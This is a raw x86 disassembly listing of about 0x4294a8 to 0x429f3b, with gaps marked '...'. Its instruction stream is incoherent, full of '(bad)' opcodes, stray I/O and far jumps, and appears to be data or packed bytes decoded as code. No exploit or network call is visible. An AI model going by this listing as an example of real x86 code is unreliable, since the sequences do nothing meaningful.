  4294a8:	mov    DWORD PTR [eax+ebx*8+0x72],esp
  4294ac:	pop    ds
  4294ad:	mul    DWORD PTR [edx+edx*4-0x637e60b9]
  4294b4:	push   0x2ea9b9f4
  4294b9:	pop    ecx
  4294ba:	pop    es
  4294bb:	shld   DWORD PTR [esi-0x12ee02f2],esi,cl
  4294c2:	addr16 popa 
  4294c4:	sub    DWORD PTR [edx],edi
  4294c6:	(bad)  
  4294c7:	lods   al,BYTE PTR ds:[esi]
  4294c8:	add    edx,DWORD PTR [edx-0x7a]
  4294cb:	adc    eax,0xb0e4b84
  4294d0:	xchg   ebx,eax
  4294d1:	outs   dx,BYTE PTR ds:[esi]
  4294d2:	push   ss
  4294d3:	in     eax,0x26
  4294d5:	jge    0x42945d
  4294d7:	inc    eax
  4294d8:	out    0xa7,al
  4294da:	iret   
  4294db:	cs nop
  4294dd:	xor    eax,0xf9a950d9
  4294e2:	scas   al,BYTE PTR es:[edi]
  4294e3:	xor    ch,bl
  4294e5:	jp     0x4294cf
  4294e7:	sub    DWORD PTR [ebp+0x71],ecx
  4294ea:	inc    eax
  4294eb:	les    ecx,FWORD PTR [edx+0x82]
	...
  429555:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429559:	sub    al,0x53
  42955b:	ds jg  0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp+0x347a52ea],dx
  429565:	mov    ebx,0x1bb67
  42956a:	add    BYTE PTR [ecx],al
  42956c:	add    BYTE PTR [eax],al
  42956e:	xor    al,0x7c
  429570:	add    BYTE PTR [esi+0x42710774],0xbc
  429577:	clc    
  429578:	and    al,0x24
  42957a:	sbb    ch,BYTE PTR [ecx+0x5c]
  42957d:	hlt    
  42957e:	dec    ebx
  42957f:	(bad)  
  429580:	into   
  429581:	pop    edi
  429582:	mov    edx,0xf75dafc7
  429587:	push   ebp
  429588:	dec    esi
  429589:	(bad)  
  42958a:	mov    ebp,0x587517a1
  42958f:	inc    ebx
  429590:	cmp    esp,DWORD PTR [eax-0x31]
  429593:	add    eax,0xc55e511f
  429598:	sahf   
  429599:	shr    DWORD PTR [edx+0x6c],1
  42959c:	mov    ecx,ebx
  42959e:	add    eax,0x38fcd32e
  4295a3:	inc    esi
  4295a4:	sub    BYTE PTR [eax],bl
  4295a6:	sub    DWORD PTR ds:0x87ece4c6,eax
  4295ac:	fiadd  DWORD PTR [ebp-0xd]
  4295af:	mov    dh,0x1e
  4295b1:	jno    0x42953e
  4295b3:	fidiv  DWORD PTR ds:[ebx+ecx*2-0x6c426052]
  4295bb:	arpl   WORD PTR [esp+esi*1],ax
  4295be:	push   es
  4295bf:	retf   
  4295c0:	dec    edx
  4295c1:	sar    BYTE PTR [eax-0x6cb2255f],cl
  4295c7:	jb     0x42961c
  4295c9:	sbb    al,0x55
  4295cb:	jl     0x429620
  4295cd:	adc    DWORD PTR [esi-0x1dbdcd08],esp
  4295d3:	push   0xffffff9a
  4295d5:	add    al,0x4d
  4295d7:	sbb    DWORD PTR [ebp+0x5245e68c],esi
  4295dd:	pop    esp
  4295de:	xchg   ebx,eax
  4295df:	sti    
  4295e0:	ss addr16 dec ebp
  4295e3:	add    edx,esp
  4295e5:	pop    ebp
  4295e6:	xor    ax,0x872
  4295ea:	xchg   edi,eax
  4295eb:	test   eax,0x434a2c3
  4295f0:	sahf   
  4295f1:	or     eax,0xc12c7372
  4295f6:	ja     0x4295c3
  4295f8:	sar    esi,cl
  4295fa:	out    0xb5,al
  4295fc:	xchg   edi,eax
  4295fd:	stos   BYTE PTR es:[edi],al
  4295fe:	loope  0x4295af
  429600:	pop    ds
  429601:	jbe    0x429656
  429603:	xor    al,0x40
  429605:	cwde   
  429606:	add    ah,0x91
  429609:	pop    ebp
  42960a:	out    dx,eax
  42960b:	ds mov esp,0x9581e892
  429611:	js     0x4295e3
  429613:	xchg   esp,eax
  429614:	pop    ebp
  429615:	jl     0x42963d
  429617:	pop    ebp
  429618:	sbb    eax,0x97855d28
  42961d:	ret    0x140d
  429620:	pop    edx
  429621:	mov    ds:0x4c35f923,al
  429626:	imul   eax,DWORD PTR [ecx+0x40],0x157d9b70
  42962d:	clc    
  42962e:	out    dx,eax
  42962f:	cwde   
  429630:	bound  esi,QWORD PTR [ebx-0x34]
  429633:	pushf  
  429634:	xchg   edi,eax
  429635:	mov    eax,0x19d1e6d2
  42963a:	into   
  42963b:	popf   
  42963c:	ins    BYTE PTR es:[edi],dx
  42963d:	ds inc edi
  42963f:	and    edx,DWORD PTR [ebx+0x1f]
  429642:	add    dl,BYTE PTR [ebp+0x2b]
  429645:	fisttp QWORD PTR [eax+0xc]
  429648:	cld    
  429649:	fcmovu st,st(1)
  42964b:	aaa    
  42964c:	adc    edx,edx
  42964e:	lods   eax,DWORD PTR ds:[esi]
  42964f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429650:	sub    ecx,DWORD PTR [edi]
  429652:	jp     0x4295f7
  429654:	idiv   esi
  429656:	es pop edi
  429658:	xchg   edi,eax
  429659:	stos   DWORD PTR es:[edi],eax
  42965a:	je     0x429611
  42965c:	or     bl,0x8e
  42965f:	xor    BYTE PTR ds:0x139276f,ah
  429665:	push   edx
  429666:	pop    esp
  429667:	push   ss
  429668:	xor    BYTE PTR ds:0x35fa4b6a,al
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	scas   eax,DWORD PTR es:[edi]
  4296e3:	aad    0xcf
  4296e5:	jo     0x42974e
  4296e7:	mov    esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	leave  
  4296ef:	cmp    ah,0x29
  4296f2:	pop    ds
  4296f3:	pop    ebx
  4296f4:	leave  
  4296f5:	(bad)  
  4296f6:	loop   0x4296fe
  4296f8:	scas   eax,DWORD PTR es:[edi]
  4296f9:	lock mov esp,0xd7f51374
  4296ff:	test   BYTE PTR [edx-0x68],cl
  429702:	hlt    
  429703:	pop    edx
  429704:	mov    es,WORD PTR [edi-0x7b83a954]
  42970a:	clc    
  42970b:	dec    esp
  42970c:	xor    bl,BYTE PTR [edx-0x39]
  42970f:	cmp    al,0x49
  429711:	jae    0x42975b
  429713:	popf   
  429714:	adc    DWORD PTR [edx+eax*1+0x5a],eax
  429718:	repnz and eax,DWORD PTR [eax-0x36]
  42971c:	nop
  42971d:	enter  0x2927,0xeb
  429721:	repz pop ds
  429723:	data16 in al,0xbb
  429726:	push   ds
  429727:	daa    
  429728:	icebp  
  429729:	jecxz  0x429731
  42972b:	push   ebp
  42972c:	gs popf 
  42972e:	inc    ecx
  42972f:	lods   al,BYTE PTR ds:[esi]
  429730:	inc    ebx
  429731:	in     eax,dx
  429732:	retf   0x5ebc
  429735:	push   0x5
  429737:	adc    DWORD PTR [esp+ebx*1-0x32],esi
  42973b:	cmc    
  42973c:	cmp    al,0xb2
  42973e:	mov    cl,0x6d
  429740:	inc    esi
  429741:	fwait
  429742:	dec    ecx
  429743:	jo     0x429734
  429745:	xchg   ebx,eax
  429746:	jg     0x42976f
  429748:	jecxz  0x4296d8
  42974a:	push   0xffffff89
  42974c:	nop
  42974d:	retf   0x2c85
  429750:	xchg   DWORD PTR [esi],ebp
  429752:	cmc    
  429753:	ret    0xa625
  429756:	leave  
  429757:	mov    ds:0x8760ffe,eax
  42975c:	add    DWORD PTR [ebx],ebx
  42975e:	ins    BYTE PTR es:[edi],dx
  42975f:	leave  
  429760:	ins    DWORD PTR es:[edi],dx
  429761:	jne    0x4297a5
  429763:	nop
  429764:	call   0x61ecc410
  429769:	ins    BYTE PTR es:[edi],dx
  42976a:	mov    esi,0xfc1ee10d
  42976f:	icebp  
  429770:	xchg   edx,eax
  429771:	ret    0xec87
  429774:	fnstenv [esp+ebx*8-0x7e]
  429778:	xchg   ebx,eax
  429779:	js     0x4297c0
  42977b:	sti    
  42977c:	pop    ss
  42977d:	je     0x429722
  42977f:	add    bl,BYTE PTR [ebp-0x76729d8c]
  429785:	mov    bh,0xcb
  429787:	adc    ah,BYTE PTR [edi]
  429789:	stc    
  42978a:	pop    ebx
  42978b:	dec    ecx
  42978c:	sub    DWORD PTR [ebx+0x721dc495],eax
  429792:	test   BYTE PTR [ebp+0x76b83d8e],bl
  429798:	pop    ss
  429799:	xor    al,BYTE PTR [ebx]
  42979b:	clc    
  42979c:	sbb    DWORD PTR [esi-0x587c1571],0x3a612a7c
  4297a6:	lods   eax,DWORD PTR ds:[esi]
  4297a7:	inc    ebx
  4297a8:	or     BYTE PTR [ebp+0xa455bea],0x6c
  4297af:	mov    ch,0x15
  4297b1:	sub    al,BYTE PTR [esi+0x2e]
  4297b4:	sub    esp,eax
  4297b6:	outs   dx,BYTE PTR ds:[esi]
  4297b7:	inc    eax
  4297b8:	xor    al,0x84
  4297ba:	mov    dh,0x3c
  4297bc:	test   eax,0x160b095f
  4297c1:	cld    
  4297c2:	adc    al,al
  4297c4:	das    
  4297c5:	inc    eax
  4297c6:	mov    ecx,0x6f925521
  4297cb:	rcl    DWORD PTR ds:0x1f30dc33,1
  4297d1:	xchg   esi,eax
  4297d2:	dec    eax
  4297d3:	sub    al,0xca
  4297d5:	cmp    edi,DWORD PTR [edx]
  4297d7:	xor    edi,ebx
  4297d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4297da:	jmp    0x1e4f:0xe2c85e5d
  4297e1:	mov    BYTE PTR [eax+ebx*2],dh
  4297e4:	dec    ebp
  4297e5:	ret    0x7b12
  4297e8:	adc    BYTE PTR [edx+0x49],ah
  4297eb:	ins    DWORD PTR es:[edi],dx
  4297ec:	jmp    0x429847
	...
  429855:	add    BYTE PTR [eax],dh
  429857:	inc    edx
  429858:	fbld   TBYTE PTR [edx-0x1]
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	call   0x1bd:0x67e79127
  429869:	add    BYTE PTR [eax],al
  42986b:	add    DWORD PTR [eax],eax
  42986d:	add    bh,al
  42986f:	sbb    BYTE PTR [edi+0x59],dl
  429872:	push   esi
  429873:	add    al,0x72
  429875:	cmp    ebp,ebp
  429877:	data16 mov al,ds:0xc569e1d0
  42987d:	outs   dx,BYTE PTR ds:[esi]
  42987e:	xchg   edi,eax
  42987f:	push   cs
  429880:	adc    bl,BYTE PTR [ebx]
  429882:	jp     0x429842
  429884:	jb     0x429888
  429886:	jns    0x42985d
  429888:	out    0x51,al
  42988a:	mov    bl,0x9d
  42988d:	and    al,0x8a
  42988f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429890:	aam    0x51
  429892:	loope  0x429823
  429894:	mov    dl,0x16
  429896:	pushf  
  429897:	cwde   
  429898:	ror    cl,1
  42989a:	leave  
  42989b:	cpuid  
  42989d:	pop    edx
  42989e:	cdq    
  42989f:	repz js 0x42988a
  4298a2:	mov    ecx,0x76e1b30f
  4298a7:	inc    edi
  4298a8:	out    dx,al
  4298a9:	lar    edi,dx
  4298ac:	jb     0x4298ea
  4298ae:	jecxz  0x429892
  4298b0:	jb     0x429864
  4298b2:	mov    eax,0x90ff73c0
  4298b7:	push   es
  4298b8:	mov    ch,BYTE PTR [eax]
  4298ba:	inc    ecx
  4298bb:	(bad)  
  4298bc:	ins    BYTE PTR es:[edi],dx
  4298bd:	out    0x95,eax
  4298bf:	popa   
  4298c0:	hlt    
  4298c1:	(bad)  
  4298c5:	into   
  4298c6:	cdq    
  4298c7:	jno    0x4298ff
  4298c9:	push   es
  4298ca:	cli    
  4298cb:	inc    eax
  4298cc:	push   eax
  4298cd:	jb     0x429912
  4298cf:	inc    eax
  4298d0:	sub    BYTE PTR [edx+eiz*8-0x66],ah
  4298d4:	lods   eax,DWORD PTR ds:[esi]
  4298d5:	mov    BYTE PTR [edi],al
  4298d7:	or     eax,0x48211427
  4298dc:	call   0xd8fd:0x681cd1fb
  4298e3:	shl    BYTE PTR fs:[edx+eiz*8-0x57566733],cl
  4298eb:	(bad)  
  4298ec:	sbb    eax,0xfe1fff6f
  4298f1:	xor    DWORD PTR [ebx+0x3a9c1b8d],esp
  4298f7:	retf   
  4298f8:	cwde   
  4298f9:	cmp    DWORD PTR [edx+0x46],edx
  4298fc:	test   cl,0x43
  4298ff:	mov    al,0xa6
  429901:	in     al,0x28
  429903:	inc    esp
  429904:	sbb    eax,0xecfb7893
  429909:	and    DWORD PTR [edx+0x7daa6e30],esi
  42990f:	and    edx,DWORD PTR [ebx+0xa]
  429912:	xor    esp,DWORD PTR [esi+esi*4]
  429915:	mov    esi,0x6e371495
  42991a:	and    eax,0xab8cabbd
  42991f:	pop    ebx
  429920:	dec    edi
  429921:	mov    edx,0x3c33d280
  429926:	cmp    ebp,DWORD PTR [edi+0x49]
  429929:	mov    al,ds:0xc328bb9a
  42992e:	or     ebp,edx
  429930:	sbb    al,BYTE PTR [eax-0x24e353db]
  429936:	cmc    
  429937:	jne    0x4298c9
  429939:	push   ebp
  42993a:	out    dx,eax
  42993b:	faddp  st(7),st
  42993d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42993e:	adc    DWORD PTR [ecx+eax*8-0x769e20fa],esp
  429945:	mov    eax,0x4e973c74
  42994a:	push   eax
  42994b:	xchg   edx,eax
  42994c:	and    ah,cl
  42994e:	dec    esp
  42994f:	pusha  
  429950:	std    
  429951:	mov    dh,0xde
  429953:	xchg   edi,eax
  429954:	and    BYTE PTR [ebp-0x130603a6],dh
  42995a:	ret    
  42995b:	ja     0x42991a
  42995d:	jmp    0x3a9b36ba
  429962:	ds pop edi
  429964:	hlt    
  429965:	stc    
  429966:	mov    ebx,0x2d7021b5
  42996b:	add    ch,cl
  42996d:	jno    0x42996f
	...
  4299d3:	add    BYTE PTR [eax],al
  4299d5:	add    BYTE PTR [edi+0x68],dl
  4299d8:	fistp  QWORD PTR fs:[edi-0x21]
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	jno    0x4299cd
  4299e4:	retf   0x6790
  4299e7:	mov    esi,0x1000001
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	test   al,0x8
  4299f0:	mov    al,ds:0xa4da64f5
  4299f5:	frstor [eax]
  4299f7:	mov    BYTE PTR [edx-0x29],ch
  4299fa:	aam    0x61
  4299fc:	and    ecx,DWORD PTR [ebp+0x2d]
  4299ff:	js     0x4299e6
  429a01:	in     eax,dx
  429a02:	dec    esp
  429a03:	int    0xbe
  429a05:	dec    ecx
  429a06:	cmp    DWORD PTR [esi-0xb3d72a9],0x63c264c4
  429a10:	icebp  
  429a11:	and    al,0x3f
  429a13:	inc    esi
  429a14:	into   
  429a15:	mov    esp,0x5368ca80
  429a1a:	ds mov dh,0x48
  429a1d:	xchg   edx,eax
  429a1e:	cmc    
  429a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a20:	and    BYTE PTR [esi+eiz*8-0x6f],cl
  429a24:	jmp    0x4299d8
  429a26:	addr16 mov bl,0x5f
  429a29:	add    BYTE PTR [edx-0x48],cl
  429a2c:	add    DWORD PTR [esi+0x55c50fce],edx
  429a32:	mov    edx,gs
  429a34:	sbb    eax,DWORD PTR [ebp-0x4e6f515e]
  429a3a:	or     ecx,DWORD PTR [ebx+ebx*4+0x21]
  429a3e:	mov    BYTE PTR [ecx],bh
  429a40:	xor    DWORD PTR [ebp-0x247d4017],ebp
  429a46:	mov    gs,WORD PTR [eax-0x62ab29b2]
  429a4c:	cwde   
  429a4d:	inc    eax
  429a4e:	xor    eax,0x271a65ac
  429a53:	add    dh,cl
  429a55:	or     ah,BYTE PTR ss:[ebx+esi*8-0x30]
  429a5a:	mov    cl,0xe
  429a5c:	fadd   QWORD PTR [ecx+0x715b4122]
  429a62:	(bad)  
  429a63:	mov    esi,0xb782e146
  429a68:	jg     0x429a28
  429a6a:	(bad)  
  429a6c:	(bad)  
  429a6e:	cmp    ecx,DWORD PTR [ecx+0x68]
  429a71:	add    eax,0x433e869c
  429a76:	(bad)  
  429a77:	cmp    eax,0x16724d
  429a7c:	or     eax,0xb4c7761e
  429a81:	push   0x234ae38e
  429a86:	mov    ebp,edx
  429a88:	and    eax,0x68ce8ffd
  429a8d:	jo     0x429ac3
  429a8f:	scas   al,BYTE PTR es:[edi]
  429a90:	pop    esi
  429a91:	jbe    0x429a83
  429a93:	cmp    eax,0x9d319601
  429a98:	daa    
  429a99:	iret   
  429a9a:	outs   dx,DWORD PTR ds:[esi]
  429a9b:	and    dl,dl
  429a9d:	loope  0x429a30
  429a9f:	cmp    al,0x77
  429aa1:	repz mov ah,0x79
  429aa4:	push   ebp
  429aa5:	dec    esp
  429aa6:	cs ret 0x669c
  429aaa:	imul   ebp,DWORD PTR [ecx+0x79daf97f],0x71
  429ab1:	stos   BYTE PTR es:[edi],al
  429ab2:	scas   eax,DWORD PTR es:[edi]
  429ab3:	loopne 0x429aec
  429ab5:	stos   DWORD PTR es:[edi],eax
  429ab6:	fadd   st(1),st
  429ab8:	sbb    edi,ebp
  429aba:	adc    ah,BYTE PTR [edi]
  429abc:	fwait
  429abd:	jbe    0x429afe
  429abf:	xchg   edx,eax
  429ac0:	push   ds
  429ac1:	push   edx
  429ac2:	mov    BYTE PTR [ebp+0x32de8383],dh
  429ac8:	in     al,dx
  429ac9:	clc    
  429aca:	cmp    DWORD PTR [esi],0xc462351d
  429ad0:	sbb    DWORD PTR [esi+eax*2],esi
  429ad3:	push   0x40
  429ad5:	dec    esi
  429ad6:	cwde   
  429ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ad8:	int    0x38
  429ada:	pop    es
  429adb:	pop    ebx
  429adc:	pop    ebx
  429add:	inc    ebp
  429ade:	rcl    DWORD PTR [edi],0x5c
  429ae1:	add    eax,0x86c94483
  429ae6:	pop    ds
  429ae7:	push   esi
  429ae8:	iret   
  429ae9:	mov    ecx,0x64c65328
	...
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x10a95667
  429b63:	adc    al,0xa2
  429b65:	(bad)  
  429b66:	addr16 mov edi,0x1000001
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	nop
  429b6f:	push   esp
  429b70:	inc    ecx
  429b71:	add    ecx,edi
  429b73:	mov    bl,0x68
  429b75:	push   ebx
  429b76:	pop    eax
  429b77:	jg     0x429b38
  429b79:	retf   
  429b7a:	xor    BYTE PTR [edx+0x53634677],bl
  429b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b81:	dec    edi
  429b82:	lods   al,BYTE PTR ds:[esi]
  429b83:	sar    DWORD PTR [esi+edi*8-0x29],0xe1
  429b88:	inc    esp
  429b89:	fadd   DWORD PTR [edi]
  429b8b:	fisubr WORD PTR ds:0x198b4029
  429b91:	jmp    0x429b66
  429b93:	aaa    
  429b94:	or     ah,ch
  429b96:	mov    ds:0x9c1839c1,eax
  429b9b:	aam    0x78
  429b9d:	xchg   ebp,eax
  429b9e:	pop    esp
  429b9f:	icebp  
  429ba0:	ret    0x78e1
  429ba3:	imul   ebx,edx,0x46
  429ba6:	test   al,0x76
  429ba8:	clc    
  429ba9:	scas   al,BYTE PTR es:[edi]
  429baa:	add    ebp,esp
  429bac:	and    DWORD PTR [edx-0x46b91176],esp
  429bb2:	mov    dh,0xad
  429bb4:	pop    ds
  429bb5:	dec    edi
  429bb6:	cmp    al,0x1f
  429bb8:	jecxz  0x429b79
  429bba:	mov    edx,0x9618d1e8
  429bbf:	or     edi,DWORD PTR [eax]
  429bc1:	fist   WORD PTR [ecx+0x49798596]
  429bc7:	mov    eax,0x847e750a
  429bcc:	inc    esp
  429bcd:	call   0xcc2c:0xcf7d0160
  429bd4:	mov    al,ds:0xa914de3a
  429bd9:	shr    BYTE PTR [edx-0x66e27384],0x22
  429be0:	xor    eax,0x87828c5f
  429be5:	and    al,0xca
  429be7:	or     BYTE PTR [edi-0x3b9d17ed],ah
  429bed:	lahf   
  429bee:	xor    BYTE PTR [ebx-0x58443176],0xcc
  429bf5:	push   edi
  429bf6:	inc    edx
  429bf7:	je     0x429b85
  429bf9:	cmc    
  429bfa:	mov    esi,esi
  429bfc:	xchg   edx,eax
  429bfd:	rol    BYTE PTR [ebx-0x28],0xf1
  429c01:	fldenv [edi-0x41]
  429c04:	sbb    al,0xb6
  429c06:	das    
  429c07:	jmp    0x68a0:0x2b13fa7b
  429c0e:	imul   edx,DWORD PTR [eax],0xb13e4960
  429c14:	add    DWORD PTR [edx-0x49],0x40200b1b
  429c1b:	xor    eax,ebx
  429c1d:	push   ecx
  429c1e:	lods   eax,DWORD PTR ds:[esi]
  429c1f:	shr    cl,cl
  429c21:	or     eax,0xd0522107
  429c26:	mov    eax,0x80940cf6
  429c2b:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  429c2d:	call   0xa9f1cd30
  429c32:	xor    ebp,DWORD PTR [edx]
  429c34:	mov    ds,WORD PTR gs:[esi]
  429c37:	clc    
  429c38:	or     eax,0x86122006
  429c3d:	add    al,0x6a
  429c3f:	clc    
  429c40:	jmp    0x429c97
  429c42:	std    
  429c43:	stos   DWORD PTR es:[edi],eax
  429c44:	push   edx
  429c45:	je     0x429c5d
  429c47:	dec    esi
  429c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c49:	pusha  
  429c4a:	add    DWORD PTR [eax+eax*2+0x23],edi
  429c4e:	(bad)  
  429c4f:	lahf   
  429c50:	xor    DWORD PTR [eax+0x1a2c79ae],ebp
  429c56:	rol    BYTE PTR [edx-0x6cc795e3],1
  429c5c:	pop    es
  429c5d:	or     al,0xe
  429c5f:	sti    
  429c60:	popf   
  429c61:	jne    0x429c69
  429c63:	xchg   BYTE PTR [bx+di+0x0],al
  429c67:	dec    ebp
  429c68:	adc    BYTE PTR [ecx],ah
  429c6a:	les    ebx,FWORD PTR [ebp+0xd8be]
	...
  429cd4:	add    BYTE PTR [eax],al
  429cd6:	mov    ds:0xb788a616,eax
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR [ebx-0x1],dl
  429ce4:	in     eax,dx
  429ce5:	inc    esp
  429ce6:	rol    BYTE PTR [bx+di],0x0
  429cea:	add    BYTE PTR [ecx],al
  429cec:	add    BYTE PTR [eax],al
  429cee:	das    
  429cef:	out    dx,eax
  429cf0:	cmp    BYTE PTR [ebx-0x60],bl
  429cf3:	and    dh,BYTE PTR [edx]
  429cf5:	jge    0x429d63
  429cf7:	(bad)  
  429cf8:	mov    eax,0xc0498ebf
  429cfd:	lock imul edi,eax,0xffffffa7
  429d01:	ret    
  429d02:	xchg   ebp,eax
  429d03:	std    
  429d04:	mov    esi,0x8a89270d
  429d09:	mov    edx,ebp
  429d0b:	sbb    eax,0xe7c2c988
  429d10:	test   BYTE PTR [edx-0x50],0x1e
  429d14:	test   DWORD PTR [esi+0x2af10e3f],eax
  429d1a:	fs sub eax,0x8bf0dd1e
  429d20:	int3   
  429d21:	sub    eax,0x8a986ad7
  429d26:	sbb    ebp,ecx
  429d28:	push   ebp
  429d29:	jmp    0x2a02:0xfb6b3ece
  429d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d31:	push   ebp
  429d32:	xor    DWORD PTR [ebp-0xa],esp
  429d35:	xor    ah,al
  429d37:	(bad)  
  429d38:	in     al,0xaf
  429d3a:	(bad)  [eax+ebx*1-0x7b0cb88b]
  429d41:	fidiv  DWORD PTR [eax+0x34]
  429d44:	sbb    eax,0xbcd95d2c
  429d49:	test   eax,0xe91ecec8
  429d4e:	push   ss
  429d4f:	dec    esi
  429d50:	inc    esi
  429d51:	lock adc ebx,DWORD PTR [ebp+0x5b8738f2]
  429d58:	mov    al,ds:0x419554c1
  429d5d:	and    DWORD PTR [edx+edi*1],0xffffffa2
  429d61:	mov    es,edi
  429d63:	push   esi
  429d64:	add    al,0x4e
  429d66:	push   esp
  429d67:	mov    DWORD PTR [edx-0x7],0x85a9451b
  429d6e:	mov    BYTE PTR [eax-0x69],al
  429d71:	not    al
  429d73:	(bad)  
  429d74:	and    eax,0xba2af1c3
  429d79:	jae    0x429d2a
  429d7b:	scas   eax,DWORD PTR es:[edi]
  429d7c:	jno    0x429d59
  429d7e:	pusha  
  429d7f:	sbb    bl,ah
  429d81:	or     eax,0x714f3726
  429d86:	xor    ch,bh
  429d88:	js     0x429d41
  429d8a:	cmp    ch,dl
  429d8c:	lods   eax,DWORD PTR ds:[esi]
  429d8d:	xchg   edi,eax
  429d8e:	mov    eax,0xbd440d83
  429d93:	sbb    eax,0x5d5b8f8b
  429d98:	pop    edi
  429d99:	call   0x9da:0xa7391de0
  429da0:	pop    edi
  429da1:	mov    dl,0x2c
  429da3:	inc    esi
  429da4:	adc    al,0xd9
  429da6:	add    edi,ebp
  429da8:	mov    esp,0x6a53a744
  429dad:	xlat   BYTE PTR ds:[ebx]
  429dae:	fwait
  429daf:	in     eax,dx
  429db0:	pop    edi
  429db1:	mov    ds:0x4a5ab140,al
  429db6:	push   es
  429db7:	jbe    0x429d4e
  429db9:	js     0x429e3a
  429dbb:	dec    ebx
  429dbc:	cwde   
  429dbd:	out    dx,eax
  429dbe:	test   eax,0x3ebbd2aa
  429dc3:	mov    ah,0xa4
  429dc5:	fnsave [ebx+0x217e0287]
  429dcb:	pop    ebp
  429dcd:	out    dx,al
  429dce:	xor    al,0x73
  429dd0:	or     BYTE PTR [ebx+eax*8-0x73],0xe8
  429dd5:	xor    ebp,0xf44a8a13
  429ddb:	das    
  429ddc:	jl     0x429e37
  429dde:	pop    es
  429ddf:	pusha  
  429de0:	xchg   esi,eax
  429de1:	call   0x7951:0x8b62d2f1
  429de8:	jnp    0x429db5
  429dea:	repz jg 0x429d7f
  429ded:	or     DWORD PTR [eax],eax
	...
  429e53:	add    BYTE PTR [eax],al
  429e55:	add    BYTE PTR [ebx-0x13f33b49],bl
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	cmp    DWORD PTR [ecx-0x3e982028],ebp
  429e68:	add    DWORD PTR [eax],eax
  429e6a:	add    BYTE PTR [ecx],al
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	push   eax
  429e6f:	daa    
  429e70:	mov    dl,0xe5
  429e72:	mov    al,ds:0xe9eab4d1
  429e77:	jge    0x429ee3
  429e79:	cmp    BYTE PTR [esi-0x75],0x13
  429e7d:	xor    bl,dh
  429e7f:	inc    edi
  429e80:	shl    DWORD PTR [ebp-0x12],1
  429e83:	cld    
  429e84:	jns    0x429e49
  429e86:	and    al,0x7c
  429e88:	inc    esi
  429e89:	mov    bl,0xc4
  429e8b:	sahf   
  429e8c:	jno    0x429f02
  429e8e:	add    eax,0x7bc4eee9
  429e93:	mov    ch,0xe6
  429e95:	jmp    0x429e8c
  429e97:	xchg   BYTE PTR [ecx],cl
  429e99:	pop    eax
  429e9a:	xor    bh,BYTE PTR [esi-0x71bc85bb]
  429ea0:	jge    0x429e62
  429ea2:	stos   BYTE PTR es:[edi],al
  429ea3:	sbb    DWORD PTR [esi-0x59],0xffffffae
  429ea7:	mov    WORD PTR [esi],es
  429ea9:	sub    BYTE PTR [ebp-0x6f],ah
  429eac:	xor    eax,0x3ee9897c
  429eb1:	hlt    
  429eb2:	nop
  429eb3:	js     0x429eed
  429eb5:	cmp    DWORD PTR [edx],0x3d9628b4
  429ebb:	mov    edi,0x4a44f9c9
  429ec0:	loop   0x429e5f
  429ec2:	rol    DWORD PTR [ecx-0x5e],0xfb
  429ec6:	sbb    DWORD PTR [ebx+0x535e0511],ecx
  429ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ecd:	dec    esi
  429ece:	add    eax,0xba35dc91
  429ed3:	fcmovb st,st(2)
  429ed5:	cmp    dl,al
  429ed7:	cli    
  429ed8:	sbb    BYTE PTR [ecx],al
  429eda:	outs   dx,DWORD PTR ds:[esi]
  429edb:	mov    dh,0x74
  429edd:	ja     0x429e74
  429edf:	add    BYTE PTR [ebx-0x24],dl
  429ee2:	fisub  DWORD PTR [edi]
  429ee4:	pop    edx
  429ee5:	scas   eax,DWORD PTR es:[edi]
  429ee6:	pop    esi
  429ee7:	and    eax,0xf48aa305
  429eec:	addr16 retf 0x8eb
  429ef0:	and    eax,0x52467a4b
  429ef5:	dec    ecx
  429ef6:	add    ch,BYTE PTR [eax]
  429ef8:	sub    dh,bh
  429efa:	cmp    DWORD PTR [eax-0x45a25e18],ecx
  429f00:	stos   BYTE PTR es:[edi],al
  429f01:	pop    es
  429f02:	xchg   ebx,eax
  429f03:	clc    
  429f04:	mov    eax,0x7915de83
  429f09:	lods   eax,DWORD PTR ds:[esi]
  429f0a:	mov    edi,0x260bf30f
  429f0f:	or     BYTE PTR [eax+0x6c],bl
  429f12:	xor    eax,0x47e33733
  429f17:	scas   al,BYTE PTR es:[edi]
  429f18:	out    0x3b,eax
  429f1a:	lea    ebx,gs:[esi+ecx*8+0x1b]
  429f1f:	cli    
  429f20:	pop    ss
  429f21:	aaa    
  429f22:	jbe    0x429f29
  429f24:	jns    0x429eb8
  429f26:	xlat   BYTE PTR ds:[ebx]
  429f27:	cmp    edi,eax
  429f29:	sbb    sp,WORD PTR [ebx-0x14]
  429f2d:	xor    DWORD PTR [esi],esp
  429f2f:	aam    0xf8
  429f31:	dec    edi
  429f32:	jae    0x429fb3
  429f34:	shl    DWORD PTR [edx+0x6d7483b9],0xea
  429f3b:	add    BYTE PTR [esi+0x23],0x7a
